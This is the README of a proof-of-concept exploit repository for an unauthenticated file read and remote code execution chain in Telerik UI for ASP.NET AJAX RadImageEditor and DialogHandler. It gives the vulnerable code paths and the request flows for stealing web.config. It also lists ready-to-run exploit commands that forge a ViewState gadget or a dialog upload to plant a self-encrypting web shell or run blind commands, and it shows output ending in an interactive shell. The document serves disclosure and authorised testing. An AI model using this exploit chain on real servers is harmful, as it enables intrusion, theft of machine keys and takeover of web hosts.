# RadImageEditor Unauthenticated Arbitrary File Read to RCE

Proof-of-concept for the unauthenticated arbitrary file read in RadImageEditor
(CVE-2026-18672) and the DialogHandler UploadPaths tampering vulnerability
(CVE-2026-19219) in Telerik UI for ASP.NET AJAX, fixed in 2026.3.812.

The exploit reads any file reachable by the IIS worker process, including
`web.config`, by poisoning the RadImageEditor download cache. It then escalates
to remote code execution through one of two paths depending on the target's
configuration:

- **ViewState** (default): forges a signed `__VIEWSTATE` with a
  BinaryFormatter gadget that writes a web shell to disk through `certutil`.
  Requires a static `machineKey` in `web.config`. Supports both the .NET 4.5
  format (SP800-108 derived keys) and the legacy format (raw machineKey). With
  `--rce-exec` the gadget runs a single command directly instead of dropping a
  shell (blind execution, no output returned).
- **Upload** (CVE-2026-19219): forges a `DocumentManager` dialog whose
  `UploadPaths` and `ViewPaths` point at the web root, then uploads a web shell
  through the file explorer. Requires the
  `Telerik.Web.UI.DialogParametersEncryptionKey`.

The web shell is self-encrypted. The inner logic is XOR-encrypted with the
shell's own filename as the key, so the shell only works under the exact name
the exploit chose. The exploit generates a random password per run.

---

## Vulnerability

`RadImageEditor` stores client-side control state in a hidden `_ClientState` form field. On postback, `RadWebControl.LoadPostData` deserialises this field with `JavaScriptSerializer`. The field has no message authentication code, so the client controls its content.

The `LoadClientState` override in `RadImageEditor` reads the `imageUrl` key from the deserialised dictionary and assigns it directly to the `ImageUrl` property. No path validation or canonicalisation runs.

During pre-render, `ControlPreRender` calls `StoreDownloadKey(ImageUrl)`, which inserts the attacker-controlled file path into `HttpRuntime.Cache` keyed by a freshly generated GUID. The server encrypts this GUID and writes it into the page response as the `_downloadKey` property. The attacker extracts the encrypted GUID from the response. They never need to know the encryption key because the server encrypts it for them.

A second request to the `ImageEditorCacheHandler` (reached via the `WebResource.axd?type=iec` route) presents the encrypted GUID in the `encryptedDownloadKey` form field. The handler decrypts the GUID, retrieves the cached file path, resolves it to a physical path with `MapPath`, and reads the file from disk. The only path check in `ResolveFilePathFromKey` is `StartsWith(PhysicalApplicationPath)`, which passes for any file inside the web application directory. `web.config` is inside the application directory, so it passes.

The result is a two-request unauthenticated arbitrary file read of any file within the web application root.

### DialogHandler vector (CVE-2026-19219)

Pages that render a `RadEditor` control emit a `_dialogDefinitions` JSON block containing a pre-encrypted `SerializedParameters` (`dp`) blob for each editor dialog, including the ImageEditor dialog. An attacker harvests this `dp` from any RadEditor page and POSTs it to `Telerik.Web.UI.DialogHandler.aspx?DialogName=ImageEditor` to render a standalone ImageEditor dialog. The same cache-poison chain works against this dialog instance. The `dp` blob is minted by the server, so the attacker does not need the `DialogParametersEncryptionKey`.

The dialog parameters also carry `UploadPaths`, `ViewPaths`, and `DeletePaths`. These fields are encrypted but lack integrity protection. An attacker who has read `web.config` via the file read and recovered the `DialogParametersEncryptionKey` can forge a dialog whose `UploadPaths` points at the web root, then upload a web shell through the file explorer.

---

## Attack path

```
Request 1: cache poison (standalone RadImageEditor page)

POST /imageeditor.aspx
  RadImageEditor1_ClientState = {"imageUrl":"~/web.config", ...}
    |
    v
RadWebControl.LoadPostData()
  -> JavaScriptSerializer.DeserializeObject(_ClientState)      no MAC
    |
    v
RadImageEditor.LoadClientState(dict)
  -> ImageUrl = dict["imageUrl"]                               no validation
    |
    v
RadImageEditor.ControlPreRender()
  -> StoreDownloadKey(ImageUrl)
    -> DownloadKey = Guid.NewGuid().ToString()
    -> Cache[DownloadKey] = "~/web.config"                     attacker path cached
    |
    v
Response HTML includes:
  _downloadKey = Encrypt(DownloadKey)                          server encrypts for attacker


Request 2: file retrieval

POST /WebResource.axd?type=iec&dkey=3
  encryptedDownloadKey = <value from response 1>
    |
    v
ImageEditorCacheHandler.ProcessRequest()
  -> IsCustomDownloadOperation("3")                            true
  -> IsValidDownloadKey(encryptedDownloadKey)                  decrypts to valid GUID
    |
    v
  -> GetImageFromFileSystem()
    -> ResolveFilePathFromKey()
      -> Cache.Get(decryptedGuid)                              retrieves "~/web.config"
      -> MapPath("~/web.config", appPath, crossApp: false)     resolves to C:\app\web.config
      -> filePath.StartsWith(PhysicalApplicationPath)          PASS
    |
    v
  -> StreamReader(filePath) -> BinaryReader.Read()
  -> Response.BinaryWrite(content)                             raw file content returned
```

The target path is sent application-relative (`~/web.config`). It is cached as a
raw string and resolved twice: at poison time the image fetch resolves it from the
requesting page's folder, while the cache handler later resolves it from the
application root. A bare or `../` path resolves differently in the two stages and
misses the file. `~/` anchors to the application root in both, so it is
deployment-agnostic (the exploit's `normalize_target_path` does this).

### DialogHandler variant

```
Request 0: harvest dp from a RadEditor page

GET /editor/examples/overview/defaultcs.aspx
  -> extract _dialogDefinitions -> ImageEditor -> SerializedParameters (dp)


Request 1: cache poison via DialogHandler

POST /Telerik.Web.UI.DialogHandler.aspx?DialogName=ImageEditor
  dialogParametersHolder        = <dp from request 0>
  OriginalImageLocation         = ~/web.config
    |
    v
DialogHandler renders a full ImageEditor dialog.
Same LoadClientState -> StoreDownloadKey chain executes.
Response includes the encrypted _downloadKey.


Request 2: file retrieval (same as standalone)

POST /WebResource.axd?type=iec&dkey=3
  encryptedDownloadKey = <value from response 1>
    -> raw file content returned
```

---

## Client-state trust gap

### Unsigned _ClientState (RadWebControl.cs)

```csharp
protected virtual bool LoadPostData(string postDataKey, NameValueCollection postCollection)
{
    string text = postCollection[ClientStateFieldID];
    if (!string.IsNullOrEmpty(text)
        && new JavaScriptSerializer().DeserializeObject(text) is Dictionary<string, object> clientState)
    {
        LoadClientState(clientState);
    }
    return false;
}
```

`LoadPostData` reads the `_ClientState` hidden field and deserialises it with `JavaScriptSerializer`. There is no HMAC, no ViewState MAC, and no encryption. The field is an ordinary form value that the client controls entirely.

### Trusted imageUrl assignment (RadImageEditor.cs)

```csharp
protected override void LoadClientState(Dictionary<string, object> clientState)
{
    base.LoadClientState(clientState);
    ActiveCommand = clientState["currentCommand"] as string;
    if (clientState.ContainsKey("clientOps"))
    {
        UndoStack.Deserialize(clientState["clientOps"].ToString());
    }
    if (clientState.ContainsKey("imageUrl"))
    {
        ImageUrl = clientState["imageUrl"].ToString();       // attacker-controlled
    }
    CurrentImageKey = (string)clientState["imageKey"];
    // ...
}
```

The `imageUrl` value from the client state is assigned to `ImageUrl` with no path check, no extension whitelist, and no canonicalisation.

### Cache poisoning (RadImageEditor.cs)

`ControlPreRender` calls `StoreDownloadKey(ImageUrl)`, which inserts the attacker-controlled path into the server cache:

```csharp
private void StoreDownloadKey(string imageUrl)
{
    if (string.IsNullOrEmpty(DownloadKey))
    {
        DownloadKey = Guid.NewGuid().ToString();
    }
    if (!string.IsNullOrEmpty(imageUrl))
    {
        if (ImageCacheStorageLocation == ImageStorage.Cache)
        {
            HttpRuntime.Cache.Insert(DownloadKey, imageUrl, null,
                Cache.NoAbsoluteExpiration, TimeSpan.FromMinutes(60.0),
                CacheItemPriority.NotRemovable, null);
        }
        else if (HttpContext.Current.Session != null)
        {
            HttpContext.Current.Session[DownloadKey] = imageUrl;
        }
    }
}
```

The server encrypts the GUID and embeds it in the page. The attacker reads the encrypted value from the response without needing any key material.

### File read sink (ImageEditorCacheHandler.cs)

```csharp
private string ResolveFilePathFromKey(HttpContext context, string downloadKey)
{
    object obj = context.Cache.Get(downloadKey);
    if (obj == null && context.Session != null)
    {
        obj = context.Session[downloadKey];
    }
    if (obj == null)
    {
        throw new ArgumentException(
            "The download key does not correspond to a valid virtual image path.",
            downloadKey);
    }
    string virtualPath = obj.ToString();
    virtualPath = context.Request.MapPath(virtualPath,
        context.Request.ApplicationPath, allowCrossAppMapping: false);
    if (!virtualPath.StartsWith(context.Request.PhysicalApplicationPath))
    {
        throw new NotSupportedException(
            "Using images outside of the web application path is not supported.");
    }
    return virtualPath;
}
```

`ResolveFilePathFromKey` retrieves the cached path, resolves it to a physical path via `MapPath`, and checks only that the result starts with the application's physical root. There is no extension whitelist, no filename format check, and no content-type restriction. The `allowCrossAppMapping: false` parameter prevents reads outside the application root, but every file inside it, including `web.config`, is reachable.

---

## Prerequisites

- A page rendering `<telerik:RadImageEditor />` (standalone mode) or
  `<telerik:RadEditor />` (dialog mode, with `--via-dialog`)
- Python 3.8+
- `pycryptodome` and `requests` (see `requirements.txt`)

## Usage

```bash
pip install -r requirements.txt

# Read web.config (standalone RadImageEditor page)
python3 exploit.py http://TARGET --page imageeditor.aspx

# Read web.config through a RadEditor page's dialog handler
python3 exploit.py http://TARGET \
  --page /editor/examples/overview/defaultcs.aspx --via-dialog

# Read an arbitrary file
python3 exploit.py http://TARGET --page imageeditor.aspx --file machine.config -o machine.config

# File read + RCE via ViewState (default)
python3 exploit.py http://TARGET \
  --page /editor/examples/overview/defaultcs.aspx --via-dialog \
  --rce --rce-method viewstate

# File read + blind command execution via ViewState (no web shell dropped)
python3 exploit.py http://TARGET --page imageeditor.aspx \
  --rce-exec "whoami"

# File read + RCE via forged dialog upload
python3 exploit.py http://TARGET \
  --page /editor/examples/overview/defaultcs.aspx --via-dialog \
  --rce --rce-method upload

# RCE with a known DialogParametersEncryptionKey (no file read needed)
python3 exploit.py http://TARGET \
  --page /editor/examples/overview/defaultcs.aspx --via-dialog \
  --rce --rce-method upload --dialog-key "YOUR-KEY-HERE"
```

## Flags

| Flag | Default | Description |
|---|---|---|
| `base` (positional) | required | Site base URL |
| `--page` | `imageeditor.aspx` | Target page (standalone RadImageEditor or RadEditor with `--via-dialog`) |
| `--file` | `web.config` | File to read, relative to the web-app root |
| `-o`, `--out` | stdout | Write the recovered file here |
| `-v`, `--verbose` | off | Verbose output |
| `--via-dialog` | off | Read through the RadEditor ImageEditor DialogHandler |
| `--dialog-page` | `--page` | RadEditor page to harvest dialog parameters from |
| `--proxy` | | HTTP proxy URL |
| `--user-agent` | Chrome UA | User-Agent header |

### RCE flags (`--rce`)

| Flag | Default | Description |
|---|---|---|
| `--rce` | off | Drop a web shell and run `--rce-cmd` through it |
| `--rce-method` | `viewstate` | `viewstate` or `upload` |
| `--rce-cmd` | `whoami` | Command to run through the web shell for verification |
| `--rce-exec` | | Run this command directly via the ViewState gadget instead of dropping a web shell (viewstate only; blind, no output). Implies `--rce` |
| `--rce-apppath` | `/` | IIS application virtual path (viewstate method) |
| `--webshell-password` | auto-generated | Password for the web shell |
| `--shell-name` | random | Dropped `.aspx` filename |
| `--upload-folder` | `/` | Web-root-relative folder for the shell (upload method) |
| `--keep-shell` | off | Retain the web shell on exit |
| `--webroot` | | Physical web root for the ViewState shell drop (e.g. `C:\inetpub\wwwroot\`), skipping web-root discovery |
| `--dialog-key` | | Supply the `DialogParametersEncryptionKey` directly, skipping the `web.config` read (upload method only) |

## How it works

1. Discover the Telerik.Web.UI version from the page source (assembly-qualified reference or CDN path).
2. Poison the RadImageEditor download cache by posting a forged `_ClientState` with `imageUrl` set to the target file path. The server caches the value under a GUID and returns an encrypted download key. In `--via-dialog` mode, the exploit first harvests the signed ImageEditor `dp` from any RadEditor page and replays it to `DialogHandler.aspx`.
3. Present the encrypted download key to `WebResource.axd?type=iec`, which reads the cached path from disk and returns the raw bytes.
4. If `--rce` is set, parse `web.config` from the recovered file to extract keys.
5. For `--rce-method viewstate`: forge a signed `__VIEWSTATE` carrying a `TextFormattingRunProperties` gadget chain whose `Process.Start` writes the web shell to disk. The shell's physical path comes from the web root, which the exploit recovers from the RadAsyncUpload configuration the target page embeds (its `TempTargetFolder`), falls back to probing a missing file through the read, and can be supplied directly with `--webroot`. With `--rce-exec`, the gadget runs `cmd.exe /c <command>` directly instead; nothing is written, and no output is returned (blind execution).
6. For `--rce-method upload`: forge a `DocumentManager` dialog whose `UploadPaths` cover the web root and upload the shell through the file explorer.
7. Verify the shell by sending `whoami`, then enter an interactive session.

## Files

| File | Description |
|---|---|
| `exploit.py` | The exploit. Handles file read, both RCE paths, and the interactive shell. |
| `find_radeditors.py` | Reconnaissance helper that scans a site for pages with RadEditor or RadImageEditor controls. |
| `requirements.txt` | Python dependencies. |
| `Dockerfile` | Python 3.12-slim container. |

## Expected output

```
$ python3 exploit.py http://TARGET \
    --page /editor/examples/overview/defaultcs.aspx --via-dialog \
    --rce --rce-method viewstate -v
[*] Telerik.Web.UI version: 2026.2.708.462
[*] reading 'web.config' via DialogHandler
[+] read 29567 bytes of 'web.config'
[+] generated webshell password: 3XV3hLz8IfiyZZdl

[*] RCE vector: forged ViewState -> drop web shell
[+] machineKey: validation=SHA1 decryption=AES
[+] web root: C:\TelerikLab\v708-livedemos\
[+] ViewState crypto: legacy (raw machineKey)
[+] forged ViewState: 6776 base64 chars
[*] HTTP 500 (gadget throws after writing the shell -- 500 is expected)

[+] RCE output:
iis apppool\telerikpool-v708

============================================================
  TantoSec PoC -- interactive shell
  ...
============================================================

shell>
```

## Disclaimer

The exploits and proof-of-concept code in this repository are published for
security research, defensive use, and authorised testing. All of the
vulnerabilities demonstrated here are already patched; we strongly recommend
updating Telerik UI for ASP.NET AJAX to the latest version.

## Third-party code

Parts of `exploit.py` are ported from [ysoserial.net](https://github.com/pwntester/ysoserial.net)
by Alvaro Muñoz and used under the MIT License. The copyright and license
notice is reproduced in [THIRD_PARTY_LICENSES](THIRD_PARTY_LICENSES) and at the
top of the ported section in `exploit.py`.

## License

Released under the [MIT License](../../LICENSE).
